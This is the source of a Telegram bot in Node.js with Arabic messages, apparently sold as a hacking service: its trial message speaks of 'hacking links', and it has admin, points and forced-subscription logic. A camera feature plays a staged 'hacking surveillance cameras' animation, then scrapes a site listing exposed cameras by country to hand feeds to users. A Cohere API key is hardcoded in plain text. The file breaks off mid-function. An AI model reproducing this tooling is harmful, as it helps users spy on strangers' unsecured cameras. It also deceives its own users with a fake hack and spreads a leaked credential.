const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const bodyParser = require('body-parser');
const multer = require('multer');
const path = require('path');
const useragent = require('useragent');
const TinyURL = require('tinyurl');
const axios = require('axios');
const os = require('os');
const https = require('https');
const googleTTS = require('google-tts-api');
require('dotenv').config();  

    





const sqlite3 = require('sqlite3').verbose();


let db;

function initializeDatabase() {
  return new Promise((resolve, reject) => {
    const dbPath = path.join(__dirname, 'botData.db');
    db = new sqlite3.Database(dbPath, (err) => {
      if (err) {
        console.error('خطأ في فتح قاعدة البيانات:', err.message);
        return reject(err);
      }
      console.log('تم الاتصال بقاعدة البيانات بنجاح');
      db.run(`CREATE TABLE IF NOT EXISTS data (
        key TEXT PRIMARY KEY,
        value TEXT
      )`, (err) => {
        if (err) {
          console.error('خطأ في إنشاء الجدول:', err.message);
          return reject(err);
        }
        console.log('تم إنشاء الجدول بنجاح');
        resolve();
      });
    });
  });
}

function saveData(key, value) {
  return new Promise((resolve, reject) => {
    db.run(`REPLACE INTO data (key, value) VALUES (?, ?)`, [key, JSON.stringify(value)], (err) => {
      if (err) {
        console.error('خطأ في حفظ البيانات:', err.message);
        return reject(err);
      }
      console.log(`تم حفظ البيانات بنجاح للعنصر: ${key} بالقيمة: ${JSON.stringify(value)}`);
      resolve();
    });
  });
}

function loadData(key) {
  return new Promise((resolve, reject) => {
    db.get(`SELECT value FROM data WHERE key = ?`, [key], (err, row) => {
      if (err) {
        console.error('خطأ في تحميل البيانات:', err.message);
        return reject(err);
      }
      if (row) {
        console.log(`تم تحميل البيانات بنجاح للعنصر: ${key}`);
        resolve(JSON.parse(row.value));
      } else {
        console.log(`لم يتم العثور على البيانات للعنصر: ${key}`);
        resolve(null);
      }
    });
  });
}

async function initializeDefaultData() {
  userVisits = await loadData('userVisits') || {};
  platformVisits = await loadData('platformVisits') || {};
  allUsers = new Map(await loadData('allUsers') || []);
  activatedUsers = new Set(await loadData('activatedUsers') || []);
  bannedUsers = new Map(await loadData('bannedUsers') || []);
  subscribedUsers = new Set(await loadData('subscribedUsers') || []);
  userPoints = new Map(await loadData('userPoints') || []);
  userReferrals = new Map(await loadData('userReferrals') || []);
  usedReferralLinks = new Map(await loadData('usedReferralLinks') || []);
  pointsRequiredForSubscription = (await loadData('pointsRequiredForSubscription')) || 15;
}

async function saveAllData() {
  try {
    await saveData('userVisits', userVisits);
    await saveData('platformVisits', platformVisits);
    await saveData('allUsers', Array.from(allUsers));
    await saveData('activatedUsers', Array.from(activatedUsers));
    await saveData('bannedUsers', Array.from(bannedUsers));
    await saveData('subscribedUsers', Array.from(subscribedUsers));
    await saveData('userPoints', Array.from(userPoints));
    await saveData('userReferrals', Array.from(userReferrals));
    await saveData('usedReferralLinks', Array.from(usedReferralLinks));
    await saveData('pointsRequiredForSubscription', pointsRequiredForSubscription);
    console.log('تم حفظ جميع البيانات بنجاح');
  } catch (error) {
    console.error('خطأ أثناء حفظ جميع البيانات:', error.message);
  }
}

// تحميل البيانات عند بدء التشغيل
initializeDatabase().then(() => {
  return initializeDefaultData();
}).then(() => {
  console.log('تم تحميل البيانات وبدء تشغيل البوت');
  // هنا يمكنك بدء تشغيل البوت
}).catch(error => {
  console.error('حدث خطأ أثناء تحميل البيانات:', error.message);
  process.exit(1);
});

// حفظ البيانات بشكل دوري كل 5 دقائق
setInterval(() => {
  saveAllData().catch(error => console.error('فشل في الحفظ الدوري للبيانات:', error.message));
}, 5 * 60 * 1000);

// معالجة إشارة الإيقاف لحفظ البيانات قبل إيقاف التطبيق
process.on('SIGINT', async () => {
  console.log('تم استلام إشارة إيقاف، جاري حفظ البيانات...');
  try {
    await saveAllData();
    console.log('تم حفظ البيانات بنجاح. إيقاف البوت...');
    db.close((err) => {
      if (err) {
        console.error('خطأ في إغلاق قاعدة البيانات:', err.message);
        process.exit(1);
      }
      console.log('تم إغلاق قاعدة البيانات بنجاح.');
      process.exit(0);
    });
  } catch (error) {
    console.error('فشل في حفظ البيانات قبل الإيقاف:', error.message);
    process.exit(1);
  }
});

// برنامج للتحقق من البيانات المحفوظة في قاعدة البيانات
function verifyData() {
  const dbPath = path.join(__dirname, 'botData.db');
  const db = new sqlite3.Database(dbPath, (err) => {
    if (err) {
      return console.error('خطأ في فتح قاعدة البيانات:', err.message);
    }
    console.log('تم الاتصال بقاعدة البيانات بنجاح');

    db.all(`SELECT key, value FROM data`, [], (err, rows) => {
      if (err) {
        return console.error('خطأ في استعلام البيانات:', err.message);
      }
      console.log('البيانات في قاعدة البيانات:');
      rows.forEach((row) => {
        console.log(`${row.key}: ${row.value}`);
      });

      db.close((err) => {
        if (err) {
          return console.error('خطأ في إغلاق قاعدة البيانات:', err.message);
        }
        console.log('تم إغلاق قاعدة البيانات بنجاح.');
      });
    });
  });
}

// استدعاء دالة التحقق من البيانات بعد حفظها للتحقق من صحة الحفظ
setTimeout(verifyData, 10000); // تأخير بسيط لضمان أن البيانات قد تم حفظها







const fs = require('fs');

// تأكد من وجود مجلد الفيديوهات
const videosDir = path.join(__dirname, 'videos');
if (!fs.existsSync(videosDir)) {
    fs.mkdirSync(videosDir);
}

// تأكد من أن المجلد موجود



const token = process.env.TELEGRAM_BOT_TOKEN; // استخدم المتغير البيئي للتوكن
const bot = new TelegramBot(token, { polling: true });

// باقي الكود

const users = new Set();

bot.on('message', (msg) => {
  users.add(msg.from.id);
});


// باقي إعدادات البوت والتطبيق

const app = express();
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.static(path.join(__dirname, 'uploads')));
const storage = multer.memoryStorage();
const upload = multer({ storage: multer.memoryStorage() });



const MAX_FREE_ATTEMPTS = 120;
const freeTrialEndedMessage = "انتهت فترة التجربة المجانيه لان تستطيع استخدام اي رابط اختراق حتى تقوم بل الاشتراك من المطور او قوم بجمع نقاط لاستمرار في استخدام البوت";

const forcedChannelUsernames = ['@SJGDDW', '@Y_E_SG', '@S_S_YE', '@YYY_A12', '@YEMENCYBER101'];


// دالة للتحقق من المسؤول
const adminId = '7130416076';
function isAdmin(userId) {
  return userId.toString() === adminId;
}

// دالة لإضافة نقاط لمستخدم معين
function addPointsToUser(userId, points) {
  if (!allUsers.has(userId)) {
    allUsers.set(userId, { id: userId, points: 0 });
  }
  const user = allUsers.get(userId);
  user.points = (user.points || 0) + points;
  userPoints.set(userId, user.points);
  checkSubscriptionStatus(userId);
  saveData().catch(error => console.error('فشل في حفظ البيانات:', error));
  return user.points;
}

function deductPointsFromUser(userId, points) {
  if (!allUsers.has(userId)) {
    return false;
  }
  const user = allUsers.get(userId);
  if ((user.points || 0) >= points) {
    user.points -= points;
    userPoints.set(userId, user.points);
    saveData().catch(error => console.error('فشل في حفظ البيانات:', error)); // حفظ البيانات بعد خصم النقاط
    return true;
  }
  return false;
}

// دالة لحظر مستخدم
function banUser(userId) {
  bannedUsers.set(userId.toString(), true);
  saveData().catch(error => console.error('فشل في حفظ البيانات:', error));
}
// دالة لإلغاء حظر مستخدم
function unbanUser(userId) {
  const result = bannedUsers.delete(userId.toString());
  saveData().catch(error => console.error('فشل في حفظ البيانات:', error));
  return result;
}
// دالة لإرسال رسالة لجميع المستخدمين
function broadcastMessage(message) {
  allUsers.forEach((user, userId) => {
    bot.sendMessage(userId, message).catch(error => {
      console.error(`Error sending message to ${userId}:`, error.message);
    });
  });
}

// دالة إنشاء لوحة المفاتيح للمسؤول
function createAdminKeyboard() {
  return {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'حظر مستخدم', callback_data: 'ban' }],
        [{ text: 'إلغاء حظر مستخدم', callback_data:'unban' }],
        [{ text: 'عرض الإحصائيات', callback_data:'stats' }],
        [{ text: 'إرسال رسالة', callback_data:'broadcast' }],
        [{ text: 'قائمة المحظورين', callback_data:'abo' }],
        [{ text: 'إضافة نقاط', callback_data: 'addpoints' }],
        [{ text: 'خصم نقاط', callback_data:'deductpoints' }],
        [{ text: 'تعيين نقاط الاشتراك', callback_data: 'setsubscriptionpoints' }],
        [{ text: 'الاشتراك', callback_data:'subscribe' }],
        [{ text: 'إلغاء الاشتراك', callback_data:'unsubscribe' }],
        [{ text: 'إلغاء اشتراك جميع المستخدمين', callback_data:'unsubscribe_all' }],
        [{ text: 'إضافة اشتراك لجميع المستخدمين ', callback_data:'subscribe_all' }],
        [{ text: 'عرض المشتركين', callback_data:'listsubscribers' }],
        [{ text: 'إرسال نقاط للجميع', callback_data:'send_points_to_all' }],
        [{ text: 'خصم نقاط من الجميع', callback_data:'deduct_points_from_all' }],
        [{ text: 'حظر جميع المستخدمين', callback_data: 'ban_all_users' }],
        [{ text: 'إلغاء حظر جميع المستخدمين', callback_data:'unban_all_users' }],
      ]
    }
  };
}

// أمر المسؤول
// أمر المسؤول
bot.onText(/\/admin/, (msg) => {
  if (isAdmin(msg.from.id)) {
    bot.sendMessage(msg.chat.id, 'مرحبًا بك في لوحة تحكم المسؤول:', createAdminKeyboard());
  } else {
     bot.sendMessage(msg.chat.id, 'عذرًا، هذا الأمر متاح فقط للمسؤول.');
  }
});

// معالج callback_query للمسؤول
bot.on('callback_query', async (callbackQuery) => {
  const msg = callbackQuery.message;
  const userId = callbackQuery.from.id;
  const chatId = msg.chat.id;
  const data = callbackQuery.data;

  if (!isAdmin(userId)) {
    await bot.answerCallbackQuery(callbackQuery.id, 'تم أنشأ ورسال الرابط بنجاح .');
    return;
  }

  switch (data) {
    case 'ban':
      bot.sendMessage(chatId, 'يرجى إدخال معرف المستخدم المراد حظره:');
      bot.once('message', async (response) => {
        const userIdToBan = response.text;
        banUser(userIdToBan);
        bot.sendMessage(chatId, `تم حظر المستخدم ${userIdToBan}`);
        bot.sendMessage(userIdToBan, 'تم حظرك من استخدام هذا البوت. تواصل مع المسؤول إذا كنت تعتقد أن هذا خطأ.');
      });
      break;

    case 'unban':
      bot.sendMessage(chatId, 'يرجى إدخال معرف المستخدم المراد إلغاء حظره:');
      bot.once('message', async (response) => {
        const userIdToUnban = response.text;
        if (unbanUser(userIdToUnban)) {
          bot.sendMessage(chatId, `تم إلغاء حظر المستخدم ${userIdToUnban}`);
          bot.sendMessage(userIdToUnban, 'تم إلغاء حظرك. يمكنك الآن استخدام البوت مرة أخرى.');
        } else {
          bot.sendMessage(chatId, `المستخدم ${userIdToUnban} غير محظور.`);
        }
      });
      break;
    case 'banned_users':
  const bannedList = Array.from(bannedUsers).join(', ');
  bot.sendMessage(chatId, `قائمة المستخدمين المحظورين:\n${bannedList || 'لا يوجد مستخدمين محظورين حاليًا'}`);
  break;
    case 'addpoints':
  bot.sendMessage(chatId, 'أدخل معرف المستخدم وعدد النقاط التي تريد إضافتها (مثال: 123456789 10)');
  bot.once('message', async (response) => {
    const [userId, points] = response.text.split(' ');
    const pointsToAdd = parseInt(points);
    if (!userId || isNaN(pointsToAdd)) {
      bot.sendMessage(chatId, 'عذرًا، الرجاء إدخال المعلومات بالشكل الصحيح.');
      return;
    }
    const newPoints = addPointsToUser(userId, pointsToAdd);
    bot.sendMessage(chatId, `تمت إضافة ${pointsToAdd} نقطة للمستخدم ${userId}. رصيده الحالي: ${newPoints} نقطة.`);
    bot.sendMessage(userId, `تمت إضافة ${pointsToAdd} نقطة إلى رصيدك. رصيدك الحالي: ${newPoints} نقطة.`);
  });
  break;
    case 'deductpoints':
      bot.sendMessage(chatId, 'أدخل معرف المستخدم وعدد النقاط التي تريد خصمها (مثال: 123456789 10)');
      bot.once('message', async (response) => {
        const [userId, points] = response.text.split(' ');
        const pointsToDeduct = parseInt(points);
        if (!userId || isNaN(pointsToDeduct)) {
          bot.sendMessage(chatId, 'عذرًا، الرجاء إدخال المعلومات بالشكل الصحيح.');
          return;
        }
        if (deductPointsFromUser(userId, pointsToDeduct)) {
          const newPoints = userPoints.get(userId) || 0;
          bot.sendMessage(chatId, `تم خصم ${pointsToDeduct} نقطة من المستخدم ${userId}. رصيده الحالي: ${newPoints} نقطة.`);
          bot.sendMessage(userId, `تم خصم ${pointsToDeduct} نقطة من رصيدك. رصيدك الحالي: ${newPoints} نقطة.`);
        } else {
          bot.sendMessage(chatId, `عذرًا، المستخدم ${userId} لا يملك نقاطًا كافية للخصم.`);
        }
      });
      break;
    case 'setsubscriptionpoints':
      bot.sendMessage(chatId, 'أدخل عدد النقاط المطلوبة للاشتراك:');
      bot.once('message', async (response) => {
        pointsRequiredForSubscription = parseInt(response.text);
        bot.sendMessage(chatId, `تم تعيين عدد النقاط المطلوبة للاشتراك إلى ${pointsRequiredForSubscription}`);
      });
      break;
    case 'subscribe':
      bot.sendMessage(chatId, 'أدخل معرف المستخدم الذي تريد إضافته للمشتركين:');
      bot.once('message', async (response) => {
        const userIdToSubscribe = response.text;
        if (subscribeUser(userIdToSubscribe)) {
          bot.sendMessage(chatId, `تم اشتراك المستخدم ${userIdToSubscribe} بنجاح.`);
        } else {
          bot.sendMessage(chatId, `المستخدم ${userIdToSubscribe} مشترك بالفعل.`);
        }
      });
      break;

    case 'unsubscribe':
      bot.sendMessage(chatId, 'أدخل معرف المستخدم الذي تريد إلغاء اشتراكه:');
      bot.once('message', async (response) => {
        const userIdToUnsubscribe = response.text;
        if (unsubscribeUser(userIdToUnsubscribe)) {
          bot.sendMessage(chatId, `تم إلغاء اشتراك المستخدم ${userIdToUnsubscribe} بنجاح.`);
        } else {
          bot.sendMessage(chatId, `المستخدم ${userIdToUnsubscribe} غير مشترك أصلاً.`);
        }
      });
      break;
    case 'listsubscribers':
      const subscribersList = Array.from(subscribedUsers).join('\n');
      bot.sendMessage(chatId, `قائمة المشتركين:\n${subscribersList || 'لا يوجد مشتركين حالياً.'}`);
      break;
    case 'send_points_to_all':
  bot.sendMessage(chatId, 'أدخل عدد النقاط التي تريد إرسالها لجميع المستخدمين:');
  bot.once('message', async (msg) => {
    const points = parseInt(msg.text);
    if (!isNaN(points) && points > 0) {
      for (const [userId, user] of allUsers) {
        addPointsToUser(userId, points);
      }
      await bot.sendMessage(chatId, `تم إرسال ${points} نقطة لجميع المستخدمين.`);
    } else {
      await bot.sendMessage(chatId, 'الرجاء إدخال عدد صحيح موجب من النقاط.');
    }
  });
  break;
    case 'deduct_points_from_all':
  bot.sendMessage(chatId, 'أدخل عدد النقاط التي تريد خصمها من جميع المستخدمين:');
  bot.once('message', async (msg) => {
    const points = parseInt(msg.text);
    if (!isNaN(points) && points > 0) {
      for (const [userId, user] of allUsers) {
        deductPointsFromUser(userId, points);
      }
      await bot.sendMessage(chatId, `تم خصم ${points} نقطة من جميع المستخدمين.`);
    } else {
      await bot.sendMessage(chatId, 'الرجاء إدخال عدد صحيح موجب من النقاط.');
    }
  });
  break;
  case 'unsubscribe_all':
      const unsubscribedCount = subscribedUsers.size;
      subscribedUsers.clear();
      await bot.sendMessage(chatId, `تم إلغاء اشتراك جميع المستخدمين. تم إلغاء اشتراك ${unsubscribedCount} مستخدم.`);
      saveData().catch(error => console.error('فشل في حفظ البيانات:', error)); // حفظ البيانات بعد إلغاء اشتراك الجميع
      break;

      case 'subscribe_all':
      let subscribedCount = 0;
      for (const [userId, user] of allUsers) {
        if (!subscribedUsers.has(userId)) {
          subscribedUsers.add(userId);
          subscribedCount++;
          try {
            await bot.sendMessage(userId, 'تم تفعيل اشتراكك في البوت. يمكنك الآن استخدام جميع الميزات.');
          } catch (error) {
            console.error(`فشل في إرسال رسالة للمستخدم ${userId}:`, error);
          }
        }
      }
      await bot.sendMessage(chatId, `تم إضافة اشتراك لـ ${subscribedCount} مستخدم جديد.`);
      saveData().catch(error => console.error('فشل في حفظ البيانات:', error)); // حفظ البيانات بعد اشتراك الجميع
      break;
     case 'ban_all_users':
      allUsers.forEach((user, userId) => {
        bannedUsers.set(userId, true);
      });
      await bot.sendMessage(chatId, 'تم حظر جميع المستخدمين.');
      broadcastMessage('تم إيقاف استخدام البوت من قبل المطور.');
      break;

    case 'unban_all_users':
      bannedUsers.clear();
      await bot.sendMessage(chatId, 'تم إلغاء حظر جميع المستخدمين.');
      broadcastMessage('تم تشغيل البوت من قبل المطور.');
      break;
      case 'broadcast':
      bot.sendMessage(chatId, 'يرجى إدخال الرسالة التي تريد إرسالها لجميع المستخدمين:');
      bot.once('message', async (response) => {
        const message = response.text;
        users.forEach(userId => {
          bot.sendMessage(userId, message);
        });
        bot.sendMessage(chatId, 'تم إرسال الرسالة لجميع المستخدمين.');
      });
      break;
  }

  await bot.answerCallbackQuery(callbackQuery.id);
});

bot.on('some_event', (msg) => {
  sendBotStats(msg.chat.id);
});

  // معالج زر "نقاطي"

// الكائنات المستخدمة لتخزين البيانات

// دالة لتسجيل مسؤول الحظر
function recordBanAction(userId, adminId) {
  const adminName = getUsername(adminId);
  bannedUsers.set(userId, adminName);
}

function getUsername(userId) {
  return allUsers.get(userId)?.username || 'Unknown';
}

function updateUserBlockStatus(userId, hasBlocked) {
  if (allUsers.has(userId)) {
    allUsers.get(userId).hasBlockedBot = hasBlocked;
  } else {
    allUsers.set(userId, { hasBlockedBot: hasBlocked });
  }
}

bot.on('left_chat_member', (msg) => {
  const userId = msg.left_chat_member.id;
  if (!msg.left_chat_member.is_bot) {
    updateUserBlockStatus(userId, true);
  }
});

bot.on('my_chat_member', (msg) => {
  if (msg.new_chat_member.status === 'kicked' || msg.new_chat_member.status === 'left') {
    const userId = msg.from.id;
    updateUserBlockStatus(userId, true);
  }
});

function isUserBlocked(userId) {
  return allUsers.get(userId)?.hasBlockedBot || false;
}

function sendBotStats(chatId) {
  const totalUsers = allUsers.size;
  const activeUsers = activatedUsers.size;
  const bannedUsersCount = bannedUsers.size;
  const usersWhoBlockedBot = Array.from(allUsers.values()).filter(user => user.hasBlockedBot).length;

  bot.sendMessage(chatId, `إحصائيات البوت:\nعدد المستخدمين الكلي: ${totalUsers}\nعدد المستخدمين النشطين: ${activeUsers}\nعدد المستخدمين المحظورين: ${bannedUsersCount}\nعدد المستخدمين الذين حظروا البوت: ${usersWhoBlockedBot}`);
}

function hasUserBlockedBefore(userId) {
  return allUsers.has(userId) && allUsers.get(userId).hasBlockedBot;
}

bot.on('message', (msg) => {
  const userId = msg.from.id;
  const chatId = msg.chat.id;

  if (isUserBlocked(userId)) {
    bot.sendMessage(chatId, 'لقد تم حظرك من استخدام البوت لأنك قمت بحذفه وحظره.', {
      reply_markup: {
        remove_keyboard: true,
      },
    });
    return;
  }

  // باقي الكود للتفاعل مع الرسائل
});

bot.on('callback_query', (query) => {
  const userId = query.from.id;
  const chatId = query.message.chat.id;
  const data = query.data;

  if (isUserBlocked(userId)) {
    bot.answerCallbackQuery(query.id, { text: 'لقد تم حظرك من استخدام البوت لأنك قمت بحذفه وحظره.', show_alert: true });
    return;
  }

  switch (data) {
    case 'stats':
      sendBotStats(chatId);
      break;

    // الحالات الأخرى يمكن إضافتها هنا
  }
});


  

  // باقي الكود للتفاعل مع الرسائل
  // إذا كان المستخدم غير محظور، يمكنك إضافة الميزات والأزرار هنا.


// مستمع للضغط على الأزرار


  
// استبدل 'YOUR_OPENAI_API_KEY' بمفتاح API الخاص بك من OpenAI







bot.on('callback_query', async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;

  if (data === 'get_joke') {
    await getJoke(chatId);
  } else if (data === 'get_love_message') {
    await getLoveMessage(chatId);
  } else if (data === 'get_cameras') {
    showCameraCountryList(chatId);
  } else if (data.startsWith('country_')) {
    const countryCode = data.split('_')[1];
    await displayCameras(chatId, countryCode);
  } else if (data.startsWith('next_') || data.startsWith('prev_')) {
    const startIndex = parseInt(data.split('_')[1], 10);
    showCountryList(chatId, startIndex);
  } else {
  
  }
});


    // استبدل 'YOUR_OPENAI_API_KEY' بمفتاح API الخاص بك من Op

// إعداد الخيارات لطلب الـ API
const COHERE_API_KEY = 'V22H6dttPDZEZW0XA2fnd05e79pYiLrzFsJ3JKQT'; // مفتاح Cohere API

async function getLoveMessage(chatId) {
    const loveMessage = 'اكتب لي رسالة طويلة جدًا لا تقل عن 800 حرف رسالة جميلة ومحرجة وكلمات جميلة أرسلها لشركة واتساب لفك الحظر عن رقمي المحظور';

    try {
        const response = await axios.post('https://api.cohere.ai/v1/generate', { // تحديد إصدار API
            model: 'command-xlarge-nightly', // اختر النموذج الذي تريده من Cohere
            prompt: loveMessage,
            max_tokens: 800,
            temperature: 0.8
        }, {
            headers: {
                'Authorization': `Bearer ${COHERE_API_KEY}`,
                'Content-Type': 'application/json'
            }
        });

        // فحص الاستجابة للتأكد من وجود البيانات المتوقعة
        if (response.data && response.data.generations && response.data.generations.length > 0) {
            const generatedText = response.data.generations[0].text;
            bot.sendMessage(chatId, generatedText);
        } else {
            console.error('Unexpected response format:', response.data);
            bot.sendMessage(chatId, 'لم أتمكن من جلب الرسالة، الرجاء المحاولة لاحقًا.');
        }
    } catch (error) {
        console.error('Error fetching love message:', error.response ? error.response.data : error.message);
        bot.sendMessage(chatId, 'حدثت مشكلة أثناء جلب الرسالة. الرجاء المحاولة مرة أخرى لاحقًا.');
    }
}

async function getJoke(chatId) {
    try {
        const jokeMessage = 'اعطيني نكته يمنيه قصيره جداً بلهجه اليمنيه الاصيله🤣🤣🤣🤣';
        const response = await axios.post('https://api.cohere.ai/v1/generate', {
            model: 'command-xlarge-nightly',
            prompt: jokeMessage,
            max_tokens: 50,
            temperature: 0.8
        }, {
            headers: {
                'Authorization': `Bearer ${COHERE_API_KEY}`,
                'Content-Type': 'application/json'
            }
        });

        const joke = response.data.generations[0].text;
        bot.sendMessage(chatId, joke);
    } catch (error) {
        console.error('Error fetching joke:', error.response ? error.response.data : error.message);
        bot.sendMessage(chatId, 'حدثت مشكلة أثناء جلب النكتة. الرجاء المحاولة مرة أخرى لاحقًا😁.');
    }
}

// مثال على كيفية استدعاء الوظائف بناءً على الإجراء المطلوب


// هنا مثال على كيف يمكنك استدعاء الدالة في سياق بوت Telegram


    // هنا يمكنك استدعاء getMessage لأي نوع من الرسائل
    
const cameraApp = {
  countryNamesWithFlags: {
   "AF": "أفغانستان 🇦🇫",
   "AL": "ألبانيا 🇦🇱",
   "DZ": "الجزائر 🇩🇿",
   "AO": "أنغولا 🇦🇴",
   "AR": "الأرجنتين 🇦🇷",
  "AM": "أرمينيا 🇦🇲",
  "AU": "أستراليا 🇦🇺",
  "AT": "النمسا 🇦🇹",
  "AZ": "أذربيجان 🇦🇿",
  "BH": "البحرين 🇧🇭",
  "BD": "بنغلاديش 🇧🇩",
  "BY": "بيلاروس 🇧🇾",
  "BE": "بلجيكا 🇧🇪",
  "BZ": "بليز 🇧🇿",
  "BJ": "بنين 🇧🇯",
  "BO": "بوليفيا 🇧🇴",
  "BA": "البوسنة والهرسك 🇧🇦",
  "BW": "بوتسوانا 🇧🇼",
  "BR": "البرازيل 🇧🇷",
  "BG": "بلغاريا 🇧🇬",
  "BF": "بوركينا فاسو 🇧ﺫ",
  "KH": "كمبوديا 🇰🇭",
  "CM": "الكاميرون 🇨🇲",
  "CA": "كندا 🇨🇦",
  "CL": "تشيلي 🇨🇱",
  "CN": "الصين 🇨🇳",
  "CO": "كولومبيا 🇨🇴",
  "CR": "كوستاريكا 🇨🇷",
  "HR": "كرواتيا 🇭🇷",
  "CY": "قبرص 🇨🇾",
  "CZ": "التشيك 🇨🇿",
  "DK": "الدنمارك 🇩🇰",
  "EC": "الإكوادور 🇪🇨",
  "EG": "مصر 🇪🇬",
  "SV": "السلفادور 🇸🇻",
  "EE": "إستونيا 🇪🇪",
  "ET": "إثيوبيا 🇪🇹",
  "FI": "فنلندا 🇫🇮",
  "FR": "فرنسا 🇫🇷",
  "GE": "جورجيا 🇬🇪",
  "DE": "ألمانيا 🇩🇪",
  "GH": "غانا 🇬🇭",
  "GR": "اليونان 🇬🇷",
  "GT": "غواتيمالا 🇬🇹",
  "HN": "هندوراس 🇭🇳",
  "HK": "هونغ كونغ 🇭🇰",
  "HU": "المجر 🇭🇺",
  "IS": "آيسلندا 🇮🇸",
  "IN": "الهند 🇮🇳",
  "ID": "إندونيسيا 🇮🇩",
  "IR": "إيران 🇮🇷",
  "IQ": "العراق 🇮🇶",
  "IE": "أيرلندا 🇮🇪",
  "IL": " المحتله 🇮🇱",
  "IT": "إيطاليا 🇮🇹",
  "CI": "ساحل العاج 🇨🇮",
  "JP": "اليابان 🇯🇵",
  "JO": "الأردن 🇯🇴",
  "KZ": "كازاخستان 🇰🇿",
  "KE": "كينيا 🇰🇪",
  "KW": "الكويت 🇰🇼",
  "KG": "قيرغيزستان 🇰🇬",
  "LV": "لاتفيا 🇱🇻",
  "LB": "لبنان 🇱🇧",
  "LY": "ليبيا 🇱🇾",
  "LT": "ليتوانيا 🇱🇹",
  "LU": "لوكسمبورغ 🇱🇺",
  "MO": "ماكاو 🇲🇴",
  "MY": "ماليزيا 🇲🇾",
  "ML": "مالي 🇲🇱",
  "MT": "مالطا 🇲🇹",
  "MX": "المكسيك 🇲🇽",
  "MC": "موناكو 🇲🇨",
  "MN": "منغوليا 🇲🇳",
  "ME": "الجبل الأسود 🇲🇪",
  "MA": "المغرب 🇲🇦",
  "MZ": "موزمبيق 🇲🇿",
  "MM": "ميانمار 🇲🇲",
  "NA": "ناميبيا 🇳🇦",
  "NP": "نيبال 🇳🇵",
  "NL": "هولندا 🇳🇱",
  "NZ": "نيوزيلندا 🇳🇿",
  "NG": "نيجيريا 🇳🇬",
  "KP": "كوريا الشمالية 🇰🇵",
  "NO": "النرويج 🇳🇴",
  "OM": "عمان 🇴🇲",
  "PK": "باكستان 🇵🇰",
  "PS": "فلسطين 🇵🇸",
  "PA": "بنما 🇵🇦",
  "PY": "باراغواي 🇵🇾",
  "PE": "بيرو 🇵🇪",
  "PH": "الفلبين 🇵🇭",
  "PL": "بولندا 🇵🇱",
  "PT": "البرتغال 🇵🇹",
  "PR": "بورتوريكو 🇵🇷",
  "QA": "قطر 🇶🇦",
  "RO": "رومانيا 🇷🇴",
  "RU": "روسيا 🇷🇺",
  "RW": "رواندا 🇷🇼",
  "SA": "السعودية 🇸🇦",
  "SN": "السنغال 🇸🇳",
  "RS": "صربيا 🇷🇸",
  "SG": "سنغافورة 🇸🇬",
  "SK": "سلوفاكيا 🇸🇰",
  "SI": "سلوفينيا 🇸🇮",
  "ZA": "جنوب أفريقيا 🇿🇦",
  "KR": "كوريا الجنوبية 🇰🇷",
  "ES": "إسبانيا 🇪🇸",
  "LK": "سريلانكا 🇱🇰",
  "SD": "السودان 🇸🇩",
  "SE": "السويد 🇸🇪",
  "CH": "سويسرا 🇨🇭",
  "SY": "سوريا 🇸🇾",
  "TW": "تايوان 🇹🇼",
  "TZ": "تنزانيا 🇹🇿",
  "TH": "تايلاند 🇹🇭",
  "TG": "توغو 🇹🇬",
  "TN": "تونس 🇹🇳",
  "TR": "تركيا 🇹🇷",
  "TM": "تركمانستان 🇹🇲",
  "UG": "أوغندا 🇺🇬",
  "UA": "أوكرانيا 🇺🇦",
  "AE": "الإمارات 🇦🇪",
  "GB": "بريطانيا 🇬🇧",
  "US": "امريكا 🇺🇸",
  "UY": "أوروغواي 🇺🇾",
  "UZ": "أوزبكستان 🇺🇿",
  "VE": "فنزويلا 🇻🇪",
  "VN": "فيتنام 🇻🇳",
  "ZM": "زامبيا 🇿🇲",
  "ZW": "زيمبابوي 🇿🇼",
  "GL": "غرينلاند 🇬🇱",
  "KY": "جزر كايمان 🇰🇾",
  "NI": "نيكاراغوا 🇳🇮",
  "DO": "الدومينيكان 🇩🇴",
  "NC": "كاليدونيا 🇳🇨",
  "LA": "لاوس 🇱🇦",
  "TT": "ترينيداد وتوباغو 🇹🇹",
  "GG": "غيرنزي 🇬🇬",
  "GU": "غوام 🇬🇺",
  "GP": "غوادلوب 🇬🇵",
  "MG": "مدغشقر 🇲🇬",
  "RE": "ريونيون 🇷🇪",
  "FO": "جزر فارو 🇫🇴",
  "MD": "مولدوفا 🇲🇩" 

  },  // ... إضافة بقية الدول هنا

  showCameraCountryList: function(chatId, startIndex = 0) {
    const buttons = [];
    const countryCodes = Object.keys(this.countryNamesWithFlags);
    const countryNames = Object.values(this.countryNamesWithFlags);

    const endIndex = Math.min(startIndex + 99, countryCodes.length);

    for (let i = startIndex; i < endIndex; i += 3) {
      const row = [];
      for (let j = i; j < i + 3 && j < endIndex; j++) {
        const code = countryCodes[j];
        const name = countryNames[j];
        row.push({ text: name, callback_data: `camera_country_${code}` });
      }
      buttons.push(row);
    }

    const navigationButtons = [];
    if (startIndex > 0) {
      navigationButtons.push({ text: "السابق", callback_data: `camera_prev_${startIndex - 99}` });
    }
    if (endIndex < countryCodes.length) {
      navigationButtons.push({ text: "التالي", callback_data: `camera_next_${endIndex}` });
    }

    if (navigationButtons.length) {
      buttons.push(navigationButtons);
    }

    bot.sendMessage(chatId, "اختر الدولة للكاميرات:", {
      reply_markup: {
        inline_keyboard: buttons
      }
    });
  },

  displayCameras: async function(chatId, countryCode) {
    try {
      const message = await bot.sendMessage(chatId, "جاري اختراق كاميرات المراقبة....");
      const messageId = message.message_id;

      for (let i = 0; i < 15; i++) {
        await bot.editMessageText(`جاري اختراق كاميرات المراقبة${'.'.repeat(i % 4)}`, {
          chat_id: chatId,
          message_id: messageId
        });
        await new Promise(resolve => setTimeout(resolve, 1000));
      }

      const url = `http://www.insecam.org/en/bycountry/${countryCode}`;
      const headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
      };

      let res = await axios.get(url, { headers });
      const lastPageMatch = res.data.match(/pagenavigator\("\?page=", (\d+)/);
      if (!lastPageMatch) {
